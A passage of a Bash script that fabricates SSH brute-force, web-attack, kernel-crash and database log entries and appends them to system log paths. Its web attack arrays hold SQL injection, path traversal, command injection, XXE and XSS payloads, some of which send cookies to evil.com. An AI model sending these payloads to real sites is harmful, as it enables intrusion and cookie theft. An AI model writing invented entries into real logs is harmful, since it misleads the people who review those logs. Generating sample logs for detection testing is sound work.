            local logout_pattern=${logout_patterns[$RANDOM % ${#logout_patterns[@]}]}
            local logout_date=$(date -d @$session_end "+%b %d %H:%M:%S")
            
            # Replace placeholders
            logout_pattern=${logout_pattern//USER/$user}
            logout_pattern=${logout_pattern//SESSION_ID/$session_id}
            
            # Create the logout entry
            local logout_entry="$logout_date $hostname $logout_pattern"
            
            # Write to auth log file
            echo "$logout_entry" >> "$auth_log_path"
            
            # Update progress
            current_entry=$((current_entry + 1))
            if [ $((current_entry % 5)) -eq 0 ]; then
                show_progress $total_entries $current_entry "Generating login activity"
            fi
        fi
    done
    
    show_notification "Login activity logs generated" "success"
    log_action "Generated login activity logs with $session_count sessions"
    
    return 0
}

# Function to generate brute force attack logs
generate_brute_force_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    local target_user="${4:-root}"
    local attacker_ip="${5:-$(printf "%d.%d.%d.%d" $((RANDOM % 223 + 1)) $((RANDOM % 255)) $((RANDOM % 255)) $((RANDOM % 255)))}"
    
    show_notification "Generating brute force attack logs..." "info"
    log_action "Started generating brute force attack logs targeting $target_user from $attacker_ip"
    
    # Get appropriate log path
    local auth_log_path=$(get_appropriate_log_path "$AUTH_LOG_PATH")
    
    # Ensure directory exists
    ensure_log_directory "$auth_log_path" || return 1
    
    # Create file if it doesn't exist
    if [ ! -f "$auth_log_path" ]; then
        touch "$auth_log_path" 2>/dev/null || {
            show_notification "Error: Cannot create auth log file: $auth_log_path" "error"
            log_action "Error: Cannot create auth log file: $auth_log_path"
            return 1
        }
    fi
    
    # Set attack time to happen during our range
    local attack_start_time=$((start_time + (end_time - start_time) / 4))
    local attack_end_time=$((attack_start_time + (num_entries * 3))) # ~3 seconds per attempt
    
    # Make sure we don't go beyond our end time
    if [ $attack_end_time -gt $end_time ]; then
        attack_end_time=$end_time
    fi
    
    # Failed login messages
    local failed_messages=(
        "sshd[PID]: Failed password for $target_user from $attacker_ip port PORT ssh2"
        "sshd[PID]: Failed password for invalid user $target_user from $attacker_ip port PORT ssh2"
        "sshd[PID]: error: PAM: Authentication failure for $target_user from $attacker_ip"
    )
    
    # Connection messages
    local connection_messages=(
        "sshd[PID]: Connection from $attacker_ip port PORT"
        "sshd[PID]: Disconnected from $attacker_ip port PORT [preauth]"
        "sshd[PID]: Received disconnect from $attacker_ip port PORT:11: Bye Bye [preauth]"
    )
    
    # Rate limiting and lockout messages
    local lockout_messages=(
        "sshd[PID]: Disconnecting: Too many authentication failures for $target_user [preauth]"
        "sshd[PID]: PAM service(sshd) ignoring max retries; RATE_LIMIT $attacker_ip as $target_user"
        "sshd[PID]: error: maximum authentication attempts exceeded for $target_user from $attacker_ip port PORT ssh2 [preauth]"
        "sshd[PID]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=$attacker_ip user=$target_user"
    )
    
    # Host and timestamp setup
    local hostname=$(hostname)
    local current_time=$attack_start_time
    local pid_base=$((RANDOM % 5000 + 1000))
    
    # Track progress
    local current_entry=0
    
    show_notification "Generating brute force attack sequence..." "info"
    
    # Add initial connection message
    local init_date=$(date -d @$current_time "+%b %d %H:%M:%S")
    local init_port=$((RANDOM % 60000 + 1024))
    local init_pid=$((pid_base + 1))
    local init_message=${connection_messages[0]//PID/$init_pid}
    init_message=${init_message//PORT/$init_port}
    
    local entry="$init_date $hostname $init_message"
    echo "$entry" >> "$auth_log_path"
    
    current_time=$((current_time + 1))
    current_entry=$((current_entry + 1))
    show_progress $num_entries $current_entry "Generating brute force logs"
    
    # Generate the attack sequence
    for ((i=1; i<num_entries; i++)); do
        # Format timestamp
        local log_date=$(date -d @$current_time "+%b %d %H:%M:%S")
        
        # Random port for this attempt
        local port=$((RANDOM % 60000 + 1024))
        local pid=$((pid_base + i))
        
        # Choose message type based on progress through attack
        local message
        local probability=$((i * 100 / num_entries)) # 0-100 based on progress
        
        if [ $probability -lt 80 ]; then
            # Most are failed password attempts
            message=${failed_messages[$RANDOM % ${#failed_messages[@]}]}
        elif [ $probability -lt 95 ]; then
            # Some connection messages
            message=${connection_messages[$RANDOM % ${#connection_messages[@]}]}
        else
            # A few lockout/rate-limit messages near the end
            message=${lockout_messages[$RANDOM % ${#lockout_messages[@]}]}
        fi
        
        # Replace placeholders
        message=${message//PID/$pid}
        message=${message//PORT/$port}
        
        # Create the log entry
        local entry="$log_date $hostname $message"
        
        # Write to auth log file
        echo "$entry" >> "$auth_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating brute force logs"
        fi
        
        # Increment time for next attempt (1-5 seconds between attempts)
        current_time=$((current_time + 1 + (RANDOM % 5)))
        
        # Make sure we don't exceed end time
        if [ $current_time -gt $attack_end_time ]; then
            break
        fi
    done
    
    # Add final disconnect message
    local final_date=$(date -d @$current_time "+%b %d %H:%M:%S")
    local final_port=$((RANDOM % 60000 + 1024))
    local final_pid=$((pid_base + num_entries))
    local final_message=${connection_messages[1]//PID/$final_pid}
    final_message=${final_message//PORT/$final_port}
    
    local entry="$final_date $hostname $final_message"
    echo "$entry" >> "$auth_log_path"
    
    current_entry=$((current_entry + 1))
    show_progress $num_entries $current_entry "Generating brute force logs"
    
    show_notification "Brute force attack logs generation complete!" "success"
    log_action "Completed generating brute force attack logs: $current_entry entries from $attacker_ip targeting $target_user"
    
    return 0
}

# Function to generate web server attack logs
generate_web_attack_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    local attack_type="$4"
    
    # Get appropriate log path
    local web_log_path=$(get_appropriate_log_path "$APACHE_ACCESS_LOG_PATH")
    
    # If Apache path not available, try Nginx
    if [ ! -f "$web_log_path" ] && [ ! -w "$(dirname "$web_log_path")" ]; then
        web_log_path=$(get_appropriate_log_path "$NGINX_ACCESS_LOG_PATH")
    fi
    
    # If neither is available, create a fake path
    if [ ! -f "$web_log_path" ] && [ ! -w "$(dirname "$web_log_path")" ]; then
        web_log_path="logs/fake/webserver/access.log"
    fi
    
    # Ensure directory exists
    ensure_log_directory "$web_log_path" || return 1
    
    # Create file if it doesn't exist
    if [ ! -f "$web_log_path" ]; then
        touch "$web_log_path" 2>/dev/null || {
            show_notification "Error: Cannot create web log file: $web_log_path" "error"
            log_action "Error: Cannot create web log file: $web_log_path"
            return 1
        }
    fi
    
    # Define attack payloads based on type
    local payloads=()
    
    case $attack_type in
        1|"sql")
            # SQL Injection attacks
            payloads=(
                "/login.php?username=admin'%20OR%20'1'='1"
                "/search.php?q=test'%20OR%20'1'='1'%20--"
                "/product.php?id=1%20OR%201=1"
                "/article.php?id=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10"
                "/index.php?category=1'%20AND%20(SELECT%201%20FROM%20(SELECT%20COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.TABLES%20GROUP%20BY%20x)a)%20AND%20'1'='1"
                "/admin/login?user=admin'%20OR%20'1'='1'%20--&password=anything"
                "/user?id=1%20AND%20SLEEP(5)"
                "/search?term=test'%20UNION%20SELECT%20@@version,2,3,4%20--"
                "/profile.php?id=1%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%20>%200"
                "/news.php?id=1%20ORDER%20BY%2010"
            )
            ;;
        2|"traversal")
            # Directory Traversal attacks
            payloads=(
                "/../../../../etc/passwd"
                "/download.php?file=../../../etc/passwd"
                "/assets/../../../../etc/shadow"
                "/images/../../../etc/passwd"
                "/includes/../../../../../../etc/passwd"
                "/view.php?page=../../../../../../../etc/passwd"
                "/file.php?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                "/download?file=/var/www/../../etc/passwd"
                "/static/..%252f..%252f..%252f..%252fetc%252fpasswd"
                "/upload/../../../etc/passwd%00.jpg"
            )
            ;;
        3|"xss")
            # XSS (Cross-Site Scripting) attacks
            payloads=(
                "/search?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
                "/comment.php?text=%3Cimg%20src%3D%27x%27%20onerror%3D%27alert(document.cookie)%27%3E"
                "/profile?name=%3Cscript%3Edocument.location%3D%27http://evil.com/c.php?cookie%3D%27%2Bdocument.cookie%3C/script%3E"
                "/feedback?message=%3Csvg/onload%3Dalert(1)%3E"
                "/post.php?title=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
                "/contact?email=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"
                "/search?term=%3C/title%3E%3Cscript%3Ealert(1)%3C/script%3E"
                "/index.php?user=%3Cbody%20onload%3Dalert(%27XSS%27)%3E"
                "/forum?topic=%3Ciframe%20src%3D%27javascript:alert(%60xss%60)%27%3E"
                "/news?id=1&title=%3Cscript%3Efetch(%27https://evil.com/steal?cookie=%27%2Bdocument.cookie)%3C/script%3E"
            )
            ;;
        4|"upload")
            # File Upload exploits
            payloads=(
                "/upload.php" # Will be used with POST methods
                "/admin/upload"
                "/dashboard/upload"
                "/cms/filemanager/upload"
                "/wp-admin/media-new.php"
                "/admin/assets/upload"
                "/attachments/upload"
                "/user/avatar/upload"
                "/api/upload"
                "/images/upload.php"
            )
            ;;
        5|"mixed"|*)
            # Mix of different attack vectors
            payloads=(
                # SQL Injection
                "/login.php?username=admin'%20OR%20'1'='1"
                "/product.php?id=1%20OR%201=1"
                # Directory Traversal
                "/download.php?file=../../../etc/passwd"
                "/images/../../../etc/passwd"
                # XSS
                "/search?q=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E"
                "/comment.php?text=%3Cimg%20src%3D%27x%27%20onerror%3D%27alert(document.cookie)%27%3E"
                "/profile?name=%3Cscript%3Edocument.location%3D%27http://evil.com/c.php?cookie%3D%27%2Bdocument.cookie%3C/script%3E"
                "/feedback?message=%3Csvg/onload%3Dalert(1)%3E"
                # Command Injection
                "/ping.php?host=127.0.0.1;cat%20/etc/passwd"
                "/dns?domain=example.com|id"
                # File upload
                "/upload.php"
                "/admin/upload"
                # Path manipulation 
                "/api/v1/users/1/../../admin/all"
                # XML attacks
                "/upload/import.php?xml=<!DOCTYPE%20foo%20[<!ENTITY%20xxe%20SYSTEM%20\"file:///etc/passwd\">]><foo>&xxe;</foo>"
                "/api/xml" # Will be used with POST methods
            )
            ;;
    esac
    
    # Generate attack timestamps - cluster around a specific attack time
    local attack_start=$((start_time + RANDOM % (end_time - start_time - 300)))
    local attack_end=$((attack_start + 300)) # 5 minute attack window
    
    # Attacker details
    local attacker_ip=$(printf "%d.%d.%d.%d" $((RANDOM % 223 + 1)) $((RANDOM % 255)) $((RANDOM % 255)) $((RANDOM % 255)))
    local attack_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    
    # For upload attacks we'll use POST, for others typically GET
    local method="GET"
    if [ "$attack_type" -eq 4 ]; then
        method="POST"
    fi
    
    show_notification "Generating web attack logs..." "info"
    
    # Track progress
    local current_entry=0
    
    # Add some legitimate traffic before attack
    local legitimate_urls=("/index.html" "/about" "/contact" "/products" "/login" "/images/logo.png" "/css/style.css")
    local legitimate_ips=("192.168.1.100" "192.168.1.101" "192.168.1.102" "10.0.0.15" "10.0.0.23")
    
    # Generate some normal traffic before attack
    for ((i=0; i<num_entries/4; i++)); do
        # Random timestamp before attack
        local ts=$(generate_random_timestamp $start_time $attack_start)
        local date_str=$(date -d @$ts "+[%d/%b/%Y:%H:%M:%S %z]")
        
        # Random legitimate components
        local url=${legitimate_urls[$RANDOM % ${#legitimate_urls[@]}]}
        local ip=${legitimate_ips[$RANDOM % ${#legitimate_ips[@]}]}
        local status=200
        local size=$((RANDOM % 10000 + 500))
        
        # Create log entry
        local entry="$ip - - $date_str \"GET $url HTTP/1.1\" $status $size \"-\" \"$attack_agent\""
        
        # Write to log
        echo "$entry" >> "$web_log_path"
        
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating web attack logs"
        fi
    done
    
    # Generate attack traffic
    local attack_count=$((num_entries / 2))
    for ((i=0; i<attack_count; i++)); do
        # Timestamp within attack window
        local ts=$((attack_start + i * (attack_end - attack_start) / attack_count))
        local date_str=$(date -d @$ts "+[%d/%b/%Y:%H:%M:%S %z]")
        
        # Random payload from our attack list
        local url=${payloads[$RANDOM % ${#payloads[@]}]}
        
        # Determine status code based on attack type
        local status
        case $attack_type in
            1) # SQL Injection
                status=$((RANDOM % 2 == 0 ? 200 : 500))
                ;;
            2) # Directory Traversal
                status=$((RANDOM % 3 == 0 ? 200 : (RANDOM % 2 == 0 ? 403 : 404)))
                ;;
            3) # XSS
                status=200
                ;;
            4) # File Upload
                status=$((RANDOM % 3 == 0 ? 200 : (RANDOM % 2 == 0 ? 403 : 413)))
                ;;
            *) # Mixed
                status=$((RANDOM % 5 == 0 ? 200 : (RANDOM % 3 == 0 ? 403 : (RANDOM % 2 == 0 ? 404 : 500))))
                ;;
        esac
        
        # Response size
        local size=$((RANDOM % 5000 + 200))
        
        # Create log entry
        local entry="$attacker_ip - - $date_str \"$method $url HTTP/1.1\" $status $size \"-\" \"$attack_agent\""
        
        # Write to log
        echo "$entry" >> "$web_log_path"
        
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating web attack logs"
        fi
    done
    
    # Generate some normal traffic after attack
    for ((i=0; i<num_entries/4; i++)); do
        # Random timestamp after attack
        local ts=$(generate_random_timestamp $attack_end $end_time)
        local date_str=$(date -d @$ts "+[%d/%b/%Y:%H:%M:%S %z]")
        
        # Random legitimate components
        local url=${legitimate_urls[$RANDOM % ${#legitimate_urls[@]}]}
        local ip=${legitimate_ips[$RANDOM % ${#legitimate_ips[@]}]}
        local status=200
        local size=$((RANDOM % 10000 + 500))
        
        # Create log entry
        local entry="$ip - - $date_str \"GET $url HTTP/1.1\" $status $size \"-\" \"$attack_agent\""
        
        # Write to log
        echo "$entry" >> "$web_log_path"
        
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $num_entries $current_entry "Generating web attack logs"
        fi
    done
    
    show_notification "Web attack logs generation complete!" "success"
    log_action "Generated web attack logs of type $attack_type from $attacker_ip"
    
    return 0
}

# Function to generate system crash and recovery logs
generate_system_crash_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating system crash and recovery logs..." "info"
    log_action "Started generating system crash and recovery logs"
    
    # Get appropriate log paths
    local system_log_path=$(get_appropriate_log_path "$SYSLOG_PATH")
    local kern_log_path=$(get_appropriate_log_path "$KERN_LOG_PATH")
    
    # Ensure directories exist
    ensure_log_directory "$system_log_path" || return 1
    ensure_log_directory "$kern_log_path" || return 1
    
    # Create files if they don't exist
    for log_path in "$system_log_path" "$kern_log_path"; do
        if [ ! -f "$log_path" ]; then
            touch "$log_path" 2>/dev/null || {
                show_notification "Error: Cannot create log file: $log_path" "error"
                return 1
            }
        fi
    done
    
    # Set crash time somewhere in the middle of our time range
    local crash_time=$((start_time + (end_time - start_time) / 3))
    local recovery_time=$((crash_time + 300)) # 5 minutes later
    
    # Hostname
    local hostname=$(hostname)
    
    # Define crash sequence messages
    local pre_crash_messages=(
        "kernel: [76717.356941] BUG: unable to handle kernel NULL pointer dereference at 0000000000000010"
        "kernel: [76717.356954] IP: kfree+0x97/0x170"
        "kernel: [76717.356960] PGD 0 P4D 0"
        "kernel: [76717.356963] Oops: 0002 [#1] SMP PTI"
        "kernel: [76717.356969] CPU: 2 PID: 8699 Comm: sshd Not tainted 5.15.0-76-generic #83-Ubuntu"
        "kernel: [76717.356973] Hardware name: Dell Inc. OptiPlex 7050/0VDN0X, BIOS 2.12.0 06/08/2021"
        "kernel: [76717.356976] RIP: 0010:kfree+0x97/0x170"
        "kernel: [76717.356981] Code: 48 8b 14 c5 c0 c4 81 a9 48 85 d2 74 6c 48 89 d6 48 c7 c7 c0 c4 a1 a9 e8 0f 0f 06 00 48 8b 03 48 8b 50 10 48 39 d3 75 14 <48> 8b 43 08 48 89 03 eb 44 48 8b 4b 10 48 39 d9 75 06 48 8b 4b 08"
        "kernel: [76717.357026] RSP: 0018:ffffadc1c2467c48 EFLAGS: 00010246"
        "kernel: [76717.357031] RAX: 0000000000000000 RBX: ffff956dc37ff000 RCX: 0000000000000000"
        "kernel: [76717.357035] RDX: 0000000000000010 RSI: 0000000000000000 RDI: ffff956dc37ff000"
        "kernel: [76717.357039] RBP: ffffadc1c2467c58 R08: ffff95702d5f6740 R09: 0000000000000000"
        "kernel: [76717.357073] Call Trace:"
        "kernel: [76717.357078]  ? kvm_arch_mmu_enable_log_dirty+0x15d/0x1a0 [kvm]"
        "kernel: [76717.357119]  ? kvm_mmu_slot_remove_write_access+0x97/0xd0 [kvm]"
        "kernel: [76717.357156]  kvm_mmu_slot_try_switch_to_readonly+0x7b/0x170 [kvm]"
        "kernel: [76717.357161] Modules linked in: vboxnetadp(OE) vboxnetflt(OE) vboxdrv(OE) intel_rapl_msr intel_rapl_common"
        "kernel: [76717.357264] CR2: 0000000000000010"
        "kernel: [76717.357268] ---[ end trace 8ca28d9c78d8b097 ]---"
        "kernel: [76717.357303] RIP: 0010:kfree+0x97/0x170"
    )
    
    local kernel_panic_messages=(
        "kernel: [76717.357331] Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b"
        "kernel: [76717.357339] CPU: 2 PID: 1 Comm: systemd Not tainted 5.15.0-76-generic #83-Ubuntu"
        "kernel: [76717.357343] Hardware name: Dell Inc. OptiPlex 7050/0VDN0X, BIOS 2.12.0 06/08/2021"
        "kernel: [76717.357347] Call Trace:"
        "kernel: [76717.357355]  __panic+0x11b/0x2b4"
        "kernel: [76717.357361]  panic+0x71/0x184"
        "kernel: [76717.357367]  do_exit+0x9b5/0x9d0"
        "kernel: [76717.357372]  do_group_exit+0x39/0xa0"
        "kernel: [76717.357378]  __x64_sys_exit_group+0x14/0x20"
        "kernel: [76717.357383]  do_syscall_64+0x5b/0x160"
        "kernel: [76717.357389]  entry_SYSCALL_64_after_hwframe+0x44/0xae"
        "kernel: [76717.357396] RIP: 0033:0x7f5c75f5a4bd"
        "kernel: [76717.357401] Code: 48 8b 0d 11 fa 0c 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 e7 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d e1 f9 0c 00 f7 d8 64 89 01 48"
        "kernel: [76717.357406] RSP: 002b:00007fff5dbf36d8 EFLAGS: 00000202 ORIG_RAX: 00000000000000e7"
        "kernel: [76717.357410] RAX: ffffffffffffffda RBX: 000055e46a04f470 RCX: 00007f5c75f5a4bd"
        "kernel: [76717.357414] RDX: 000000000000000b RSI: 000000000000003c RDI: 0000000000000000"
        "kernel: [76717.357417] RBP: 0000000000000000 R08: 000000000000000b R09: 000055e46a04f470"
        "kernel: [76717.357421] R10: 0000000000000000 R11: 0000000000000202 R12: 000055e46a04f360"
        "kernel: [76717.357425] R13: 00007fff5dbf37b0 R14: 0000000000000000 R15: 0000000000000000"
        "kernel: [76717.363441] Shutting down cpus with NMI"
        "kernel: [76717.363470] Dumping ftrace buffer:"
        "kernel: [76717.363477]    (ftrace buffer empty)"
        "kernel: [76717.363481] ---[ end Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b ]---"
    )
    
    local system_shutdown_messages=(
        "systemd[1]: Stopping System Logging Service..."
        "systemd[1]: Stopping User Manager for UID 1000..."
        "systemd[1]: Stopping D-Bus System Message Bus..."
        "systemd[1]: Stopped System Logging Service."
        "systemd[1]: Stopped D-Bus System Message Bus."
        "systemd[1]: Stopped User Manager for UID 1000."
        "systemd[1]: Stopped target Graphical Interface."
        "systemd[1]: Stopping Session c2 of user sysadmin."
        "systemd[1]: Stopped Session c2 of user sysadmin."
        "systemd[1]: Stopped target Multi-User System."
        "systemd[1]: Stopped target Basic System."
        "systemd[1]: Stopped target Sockets."
        "systemd[1]: Stopped target Paths."
        "systemd[1]: Reached target Unmount All Filesystems."
        "systemd[1]: Stopped target Local Encrypted Volumes."
        "systemd[1]: Stopped target Swap."
        "systemd[1]: Stopped target Local File Systems."
        "systemd[1]: Reached target Shutdown."
        "systemd[1]: Starting Reboot..."
    )
    
    local boot_messages=(
        "kernel: Linux version 5.15.0-76-generic (buildd@lcy02-amd64-005) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #83-Ubuntu SMP"
        "kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-5.15.0-76-generic root=UUID=43c9a908-9d36-40e8-92ac-3f351e3b3999 ro quiet splash"
        "kernel: BIOS-provided physical RAM map:"
        "kernel: ACPI: RSDP 0x00000000000F0000 000024 (v02 DELL  )"
        "systemd[1]: systemd 249.11-0ubuntu3.9 running in system mode"
        "systemd[1]: Detected virtualization kvm."
        "systemd[1]: Detected architecture x86-64."
        "systemd[1]: Hostname set to <$hostname>."
        "systemd[1]: Initializing machine ID from random generator."
        "systemd[1]: Started Journal Service."
        "systemd-journald[312]: Received request to flush runtime journal from PID 1"
        "systemd[1]: Starting Load Kernel Modules..."
        "systemd[1]: Starting Remount Root and Kernel File Systems..."
        "systemd[1]: Starting Create Static Device Nodes in /dev..."
        "systemd[1]: Starting File System Check on Root Device..."
        "systemd[1]: Finished File System Check on Root Device."
        "systemd[1]: Starting System Logging Service..."
        "systemd[1]: Mounting Kernel Configuration File System..."
        "systemd[1]: Mounted Kernel Configuration File System."
        "systemd[1]: Finished Create Static Device Nodes in /dev."
        "systemd[1]: Finished Remount Root and Kernel File Systems."
        "systemd[1]: Starting udev Kernel Device Manager..."
        "systemd[1]: Started udev Kernel Device Manager."
        "systemd[1]: Starting udev Coldplug all Devices..."
        "systemd[1]: Started System Logging Service."
        "kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode"
        "systemd[1]: Started Network Service."
        "NetworkManager[789]: <info>  [1622012345.5678] NetworkManager (version 1.36.6) starting..."
        "systemd[1]: Reached target Network."
        "systemd[1]: Started OpenSSH Server."
        "systemd[1]: Reached target Graphical Interface."
        "systemd[1]: Startup finished in 37.432s (firmware) + 5.859s (loader) + 2.512s (kernel) + 30.831s (userspace) = 76.634s."
    )
    
    # Recovery messages
    local recovery_messages=(
        "systemd[1]: Starting FSCK Recovery..."
        "systemd[1]: Started FSCK Recovery."
        "systemd[1]: Starting File System Check on /dev/sda1..."
        "systemd[1]: Finished File System Check on /dev/sda1."
        "systemd[1]: Starting Clean the Journal..."
        "systemd-journald[325]: Time spent on flushing to /var/log/journal/ac8e3ed5d42b4f0a994d13b938c843e8 is 1.328s for 4 entries."
        "systemd-journald[325]: System journal (/var/log/journal/ac8e3ed5d42b4f0a938c843e8) is 1.2G, max 4.0G, 2.8G free."
        "systemd[1]: Started Clean the Journal."
        "systemd[1]: Found orphaned device mapper node table. Trying to remove."
        "systemd[1]: Repairing broken file system locks..."
        "kernel: EXT4-fs (sda1): recovery complete"
        "kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode. Opts: errors=remount-ro"
        "systemd[1]: Started System Logging Service."
        "systemd[1]: Starting Disk Manager..."
        "systemd[1]: Started Disk Manager."
    )
    
    # Track progress
    local current_entry=0
    local total_entries=$((${#pre_crash_messages[@]} + ${#kernel_panic_messages[@]} + ${#system_shutdown_messages[@]} + ${#boot_messages[@]} + ${#recovery_messages[@]}))
    
    show_notification "Generating crash and recovery sequence..." "info"
    
    # Generate some normal logs before crash
    local pre_crash_time=$((crash_time - 600)) # 10 minutes before crash
    
    # Normal messages before crash
    for ((i=0; i<num_entries/5; i++)); do
        local ts=$(generate_random_timestamp $start_time $pre_crash_time)
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        # Random normal system message
        local services=("systemd" "NetworkManager" "cups" "cron" "sshd" "dbus")
        local service=${services[$RANDOM % ${#services[@]}]}
        
        local messages=("Starting..." "Started." "Stopping..." "Stopped." "Reloading..." "Reloaded.")
        local message=${messages[$RANDOM % ${#messages[@]}]}
        
        local entry="$date_str $hostname $service: $message"
        
        # Write to system log
        echo "$entry" >> "$system_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating crash sequence"
        fi
    done
    
    # Generate pre-crash warnings
    for ((i=0; i<${#pre_crash_messages[@]}; i++)); do
        local ts=$((pre_crash_time + i))
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        local entry="$date_str $hostname ${pre_crash_messages[$i]}"
        
        # Write to kernel log
        echo "$entry" >> "$kern_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating crash sequence"
        fi
    done
    
    # Generate kernel panic
    for ((i=0; i<${#kernel_panic_messages[@]}; i++)); do
        local ts=$((pre_crash_time + ${#pre_crash_messages[@]} + i))
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        local entry="$date_str $hostname ${kernel_panic_messages[$i]}"
        
        # Write to kernel log
        echo "$entry" >> "$kern_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating crash sequence"
        fi
    done
    
    # Generate system shutdown
    for ((i=0; i<${#system_shutdown_messages[@]}; i++)); do
        local ts=$((pre_crash_time + ${#pre_crash_messages[@]} + ${#kernel_panic_messages[@]} + i))
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        local entry="$date_str $hostname ${system_shutdown_messages[$i]}"
        
        # Write to system log
        echo "$entry" >> "$system_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating crash sequence"
        fi
    done
    
    # Generate boot sequence after crash
    for ((i=0; i<${#boot_messages[@]}; i++)); do
        local ts=$((recovery_time + i))
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        local entry="$date_str $hostname ${boot_messages[$i]}"
        
        # Write to appropriate log file based on message content
        if [[ "${boot_messages[$i]}" == kernel:* ]]; then
            echo "$entry" >> "$kern_log_path"
        else
            echo "$entry" >> "$system_log_path"
        fi
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating recovery sequence"
        fi
    done
    
    # Generate recovery messages
    for ((i=0; i<${#recovery_messages[@]}; i++)); do
        local ts=$((recovery_time + ${#boot_messages[@]} + i))
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        local entry="$date_str $hostname ${recovery_messages[$i]}"
        
        # Write to appropriate log file based on message content
        if [[ "${recovery_messages[$i]}" == kernel:* ]]; then
            echo "$entry" >> "$kern_log_path"
        else
            echo "$entry" >> "$system_log_path"
        fi
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 5)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating recovery sequence"
        fi
    done
    
    # Generate normal logs after recovery
    for ((i=0; i<num_entries/5; i++)); do
        local ts=$(generate_random_timestamp $((recovery_time + ${#boot_messages[@]} + ${#recovery_messages[@]} + 10)) $end_time)
        local date_str=$(date -d @$ts "+%b %d %H:%M:%S")
        
        # Random normal system message
        local services=("systemd" "NetworkManager" "cups" "cron" "sshd" "dbus")
        local service=${services[$RANDOM % ${#services[@]}]}
        
        local messages=("Starting..." "Started." "Stopping..." "Stopped." "Reloading..." "Reloaded.")
        local message=${messages[$RANDOM % ${#messages[@]}]}
        
        local entry="$date_str $hostname $service: $message"
        
        # Write to system log
        echo "$entry" >> "$system_log_path"
        
        # Update progress
        current_entry=$((current_entry + 1))
        if [ $((current_entry % 10)) -eq 0 ]; then
            show_progress $total_entries $current_entry "Generating normal activity"
        fi
    done
    
    show_notification "System crash and recovery logs generation complete!" "success"
    log_action "Generated system crash and recovery logs: crash at $(date -d @$crash_time), recovery at $(date -d @$recovery_time)"
    
    return 0
}

# Function to generate database maintenance logs
generate_db_maintenance_logs() {
    local start_time="$1"
    local end_time="$2"
    local num_entries="$3"
    
    show_notification "Generating database maintenance logs..." "info"
    log_action "Started generating database maintenance logs"
    
    # Get appropriate log path
    local db_log_path=$(get_appropriate_log_path "$MYSQL_ERROR_LOG_PATH")
    
    # Ensure directory exists
    ensure_log_directory "$db_log_path" || return 1
    
    # Create file if it doesn't exist
    if [ ! -f "$db_log_path" ]; then
        touch "$db_log_path" 2>/dev/null || {
            show_notification "Error: Cannot create database log file: $db_log_path" "error"
            log_action "Error: Cannot create database log file: $db_log_path"
            return 1
        }
    fi
    
    # Set backup/maintenance time to happen at a specific time during our range
    local backup_start_time=$((start_time + (end_time - start_time) / 3))
    local maintenance_start_time=$((backup_start_time + 300)) # 5 minutes after backup
    local maintenance_end_time=$((maintenance_start_time + 600)) # 10 minutes of maintenance
    
    # Database backup messages
    local backup_messages=(
        "MySQL Backup starting. Database list: all-databases"
        "Backup process initiated by automated maintenance script"
        "Backing up table structure for database 'mysql'"
        "Backing up table data for database 'mysql'"
        "Backing up table structure for database 'information_schema'"
        "Backing up table data for database 'information_schema' skipped - non-transactional"
        "Backing up table structure for database 'performance_schema'"
        "Backing up table data for database 'performance_schema' skipped - non-transactional"
        "Backing up table structure for database 'users'"
        "Backing up table data for database 'users'"
        "Backing up table structure for database 'products'"
        "Backing up table data for database 'products'"
        "Backing up table structure for database 'orders'"
        "Backing up table data for database 'orders'"
        "Backing up table structure for database 'logs'"
